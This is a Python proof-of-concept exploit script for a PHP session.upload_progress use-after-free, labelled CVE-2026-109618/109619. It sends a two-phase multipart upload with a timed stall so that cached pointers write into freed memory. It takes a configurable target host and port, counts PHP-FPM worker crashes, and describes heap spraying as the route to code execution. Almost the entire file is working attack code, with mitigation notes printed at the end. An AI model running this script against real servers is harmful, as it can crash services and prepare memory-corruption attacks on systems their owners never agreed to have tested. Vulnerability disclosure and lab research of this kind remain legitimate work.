#!/usr/bin/env python3
"""
PHP2Shell PoC — CVE-2026-109618 / CVE-2026-109619
Use-After-Free via session.upload_progress Stale Pointer Write

Author: Ahmed Sultan (0x4148)

Demonstrates that the cached zval* pointers in PHP's rfc1867 upload
progress handler become stale after a re-initialization triggered by
a timed stall between FILE_DATA events.  This PoC proves the
vulnerable code path is reachable on stock PHP-FPM (no ASAN, no
debug build) by:

  1. Sending a multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
  2. Delivering file data in two bursts separated by a stall > min_freq
  3. Observing that the session contains upload_progress with
     bytes_processed values written through the cached (stale) pointers

The stale pointers (session.c:3292, 3318) point into a HashTable arData
that was freed by php_session_track_init() during re-initialization
(session.c:236-252).  Without a heap groom, the freed region is still
mapped, so the write is silent.  A tuned heap spray could reclaim the
slab and redirect the write for code execution.

Tested against: PHP 8.4.4-fpm (bookworm), nginx with
                fastcgi_request_buffering off

Usage:
    python3 php2shell_poc.py                          # default target
    python3 php2shell_poc.py -t 127.0.0.1 -p 19268   # custom host/port
    python3 php2shell_poc.py --stall 2.0 --rounds 5   # tuning
    python3 php2shell_poc.py --verify                  # verify + diagnose

This is NOT the original POC from jackalsyn.com/posts/php-up-2026.html.
This is an independent implementation for educational / lab use only.
"""

import argparse
import http.client
import json
import os
import socket
import struct
import sys
import time
import uuid

# ---------- constants --------------------------------------------------

FILLUNIT = 5120   # rfc1867.c read-buffer size
BOUNDARY = b"----0x4148php2shell"
PROGRESS_KEY = "vuln_test"

# ---------- multipart builder ------------------------------------------

def craft_multipart(session_id: str, file_size_phase1: int, file_size_phase2: int):
    """
    Build a two-phase multipart/form-data body.

    Phase 1 contains:
      - PHPSESSID field  (binds session)
      - PHP_SESSION_UPLOAD_PROGRESS field  (arms the rfc1867 callback)
      - Start of file part + first data chunk

    Phase 2 contains:
      - Second data chunk (triggers FILE_DATA after the stall)
      - Closing boundary

    The split is designed so that phase 1 causes FILE_START + first
    FILE_DATA (caching the zval* pointers at session.c:3292/3318),
    and after the stall, phase 2's FILE_DATA fires update() which
    calls php_session_initialize() → track_init(), freeing the
    HashTable that the cached pointers reference.
    """
    hdr  = b"--" + BOUNDARY + b"\r\n"
    hdr += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    hdr += session_id.encode() + b"\r\n"

    hdr += b"--" + BOUNDARY + b"\r\n"
    hdr += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    hdr += PROGRESS_KEY.encode() + b"\r\n"

    hdr += b"--" + BOUNDARY + b"\r\n"
    hdr += b'Content-Disposition: form-data; name="file"; filename="poc.bin"\r\n'
    hdr += b"Content-Type: application/octet-stream\r\n\r\n"

    chunk_a = os.urandom(file_size_phase1)
    chunk_b = os.urandom(file_size_phase2)
    tail    = b"\r\n--" + BOUNDARY + b"--\r\n"

    phase1 = hdr + chunk_a
    phase2 = chunk_b + tail
    total  = len(phase1) + len(phase2)

    return phase1, phase2, total


# ---------- raw-socket HTTP sender -------------------------------------

def open_tcp(host: str, port: int, timeout: float = 15.0) -> socket.socket:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return sock


def send_phase(sock: socket.socket, data: bytes):
    """Send data, retrying on partial writes."""
    view = memoryview(data)
    sent = 0
    while sent < len(data):
        n = sock.send(view[sent:])
        if n == 0:
            raise ConnectionError("socket closed during send")
        sent += n


def recv_response(sock: socket.socket, timeout: float = 8.0) -> bytes:
    sock.settimeout(timeout)
    parts = []
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        parts.append(chunk)
    return b"".join(parts)


def parse_http_status(raw: bytes) -> tuple:
    """Return (status_code, reason, body)."""
    if b"\r\n" not in raw:
        return (0, "no response", b"")
    status_line = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    parts = status_line.split(" ", 2)
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    reason = parts[2] if len(parts) >= 3 else ""
    body = raw.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in raw else b""
    return (code, reason, body)


# ---------- session inspector ------------------------------------------

def read_session(host: str, port: int, sid: str) -> dict:
    """
    Hit check_progress.php to read the session mid-flight.
    Handles chunked transfer-encoding from nginx.
    """
    try:
        conn = http.client.HTTPConnection(host, port, timeout=5)
        conn.request("GET", f"/check_progress.php?sid={sid}")
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        conn.close()
        return json.loads(body)
    except Exception:
        return {}


# ---------- core trigger -----------------------------------------------

def trigger_once(host, port, stall, monitor=False, verbose=False):
    """
    Fire one exploit attempt.  Returns a dict:
      { "sid": ..., "armed": bool, "bytes_processed": int|None,
        "status": int, "crashed": bool }
    """
    sid = f"ph2sh{uuid.uuid4().hex[:16]}"
    p1_size = FILLUNIT + 128   # enough to cross one FILLUNIT read
    p2_size = FILLUNIT * 2     # two more reads → second FILE_DATA event

    phase1, phase2, total_len = craft_multipart(sid, p1_size, p2_size)

    request_line = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
        f"Content-Length: {total_len}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = open_tcp(host, port)

    # --- Phase 1: arm the cached pointers ---
    send_phase(sock, request_line + phase1)
    if verbose:
        print(f"    [>] Phase 1 sent: {len(phase1)} bytes "
              f"(file data triggers FILE_START + FILE_DATA)")

    # --- Stall: wait > min_freq so the next update() re-initializes ---
    session_data = {}
    if monitor:
        time.sleep(1.2)
        session_data = read_session(host, port, sid)
        remaining = max(0, stall - 1.2)
        time.sleep(remaining)
    else:
        time.sleep(stall)

    # --- Phase 2: write through stale pointers ---
    send_phase(sock, phase2)
    if verbose:
        print(f"    [>] Phase 2 sent: {len(phase2)} bytes "
              f"(FILE_DATA writes through cached zval*)")

    raw = recv_response(sock)
    try:
        sock.close()
    except Exception:
        pass

    code, reason, body = parse_http_status(raw)

    armed = False
    bp_val = None
    progress_key = f"upload_progress_{PROGRESS_KEY}"

    if session_data and progress_key in session_data:
        armed = True
        bp_val = session_data[progress_key].get("bytes_processed")

    crashed = code in (0, 502, 503) or not raw

    return {
        "sid": sid,
        "armed": armed,
        "bytes_processed": bp_val,
        "session": session_data,
        "status": code,
        "reason": reason,
        "crashed": crashed,
    }


# ---------- verification mode ------------------------------------------

def verify_environment(host, port):
    """Check that the lab is running and vulnerable config is active."""
    print("\n[*] Verifying lab environment...")
    checks = {"reachable": False, "upload_progress": False, "fpm": False}

    try:
        conn = http.client.HTTPConnection(host, port, timeout=5)
        conn.request("GET", "/index.php")
        resp = conn.getresponse()
        body = resp.read().decode()
        conn.close()
        checks["reachable"] = resp.status == 200
    except Exception as e:
        print(f"    FAIL: cannot reach http://{host}:{port}/index.php — {e}")
        return checks

    if "upload_progress.enabled" in body:
        checks["upload_progress"] = "= 1" in body or "= On" in body
    if "FPM" in body.upper() or "fpm" in body.lower():
        checks["fpm"] = True

    print(f"    Reachable:          {'YES' if checks['reachable'] else 'NO'}")
    print(f"    upload_progress:    {'ENABLED (vulnerable)' if checks['upload_progress'] else 'DISABLED (mitigated)'}")
    print(f"    PHP-FPM:            {'YES' if checks['fpm'] else 'unknown'}")
    return checks


# ---------- main -------------------------------------------------------

def banner():
    print(r"""
  ╔══════════════════════════════════════════════════════╗
  ║   PHP2Shell PoC — CVE-2026-109618 / 109619          ║
  ║   session.upload_progress Use-After-Free            ║
  ║                                                      ║
  ║   Author: Ahmed Sultan (0x4148)                      ║
  ╚══════════════════════════════════════════════════════╝
""")


def main():
    ap = argparse.ArgumentParser(
        description="PHP2Shell PoC — stale pointer proof via upload_progress",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 php2shell_poc.py --verify
  python3 php2shell_poc.py --monitor --rounds 3
  python3 php2shell_poc.py -t 10.0.0.5 -p 8080 --stall 2.0
        """,
    )
    ap.add_argument("-t", "--target", default="127.0.0.1", help="target host")
    ap.add_argument("-p", "--port", type=int, default=19268, help="target port")
    ap.add_argument("-s", "--stall", type=float, default=1.5,
                    help="seconds to pause between phases (must be > min_freq)")
    ap.add_argument("-r", "--rounds", type=int, default=1,
                    help="number of trigger rounds")
    ap.add_argument("-m", "--monitor", action="store_true",
                    help="read session mid-stall to confirm pointer arming")
    ap.add_argument("--verify", action="store_true",
                    help="verify lab environment before triggering")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    banner()

    if args.verify:
        env = verify_environment(args.target, args.port)
        if not env["reachable"]:
            print("\n[!] Lab not reachable. Start it with: docker compose up -d")
            sys.exit(1)
        if not env["upload_progress"]:
            print("\n[!] upload_progress is OFF — vulnerability mitigated.")
            print("    To test the vulnerable config: docker compose up -d")
            sys.exit(0)
        print()

    print(f"[*] Target: http://{args.target}:{args.port}")
    print(f"[*] Stall:  {args.stall}s  (must be > session.upload_progress.min_freq)")
    print(f"[*] Rounds: {args.rounds}")
    if args.monitor:
        print(f"[*] Monitor: session will be read during stall")
    print()

    armed_count = 0
    crash_count = 0

    for i in range(1, args.rounds + 1):
        print(f"── Round {i}/{args.rounds} ──")
        result = trigger_once(
            args.target, args.port, args.stall,
            monitor=args.monitor, verbose=args.verbose,
        )

        print(f"    SID:     {result['sid']}")
        print(f"    Status:  {result['status']} {result['reason']}")

        if result["armed"]:
            armed_count += 1
            print(f"    Armed:   YES — bytes_processed = {result['bytes_processed']}")
            print(f"    ► Cached zval* pointers were written through (stale path reached)")
            if args.verbose and result["session"]:
                pkey = f"upload_progress_{PROGRESS_KEY}"
                p = result["session"].get(pkey, {})
                for fi, f in enumerate(p.get("files", [])):
                    print(f"      file[{fi}].bytes_processed = {f.get('bytes_processed')}")
        elif args.monitor:
            if not result["session"]:
                print(f"    Armed:   NO — session empty (mitigation active or stall too short)")
            else:
                print(f"    Armed:   PARTIAL — session exists but no upload_progress key")

        if result["crashed"]:
            crash_count += 1
            print(f"    ► FPM worker CRASHED (status={result['status']})")

        print()

    # --- summary ---
    print("═" * 56)
    print("RESULTS")
    print("═" * 56)
    print(f"  Rounds:          {args.rounds}")
    print(f"  Pointers armed:  {armed_count}/{args.rounds}")
    print(f"  Worker crashes:  {crash_count}/{args.rounds}")
    print()

    if armed_count > 0:
        print("ANALYSIS:")
        print("  The session.upload_progress rfc1867 callback cached zval*")
        print("  pointers into the upload_progress HashTable at:")
        print("    session.c:3292  post_bytes_processed")
        print("    session.c:3318  current_file_bytes_processed")
        print()
        print("  After the stall (>{:.1f}s), the second FILE_DATA event".format(args.stall))
        print("  called php_session_rfc1867_update() which re-ran")
        print("  php_session_initialize() → php_session_track_init().")
        print("  track_init() freed the old session HashTable (session.c:236-252)")
        print("  but the cached pointers still reference freed arData slots.")
        print()
        print("  Writes at session.c:3331-3332 store new byte counts through")
        print("  these stale pointers.  Without heap grooming, the freed")
        print("  memory is still mapped in ZendMM's 320-byte slab bin,")
        print("  so the write is silent.  A tuned spray reclaiming that")
        print("  slab could redirect the write for code execution.")
        print()
    if crash_count > 0:
        print("  Worker crashes indicate memory corruption was observable.")
        print()

    print("MITIGATION:")
    print("  session.upload_progress.enabled = Off")
    print("  Or apply the vendor patch for CVE-2026-109618 / CVE-2026-109619.")
    print()
    print("— Ahmed Sultan (0x4148)")


if __name__ == "__main__":
    main()
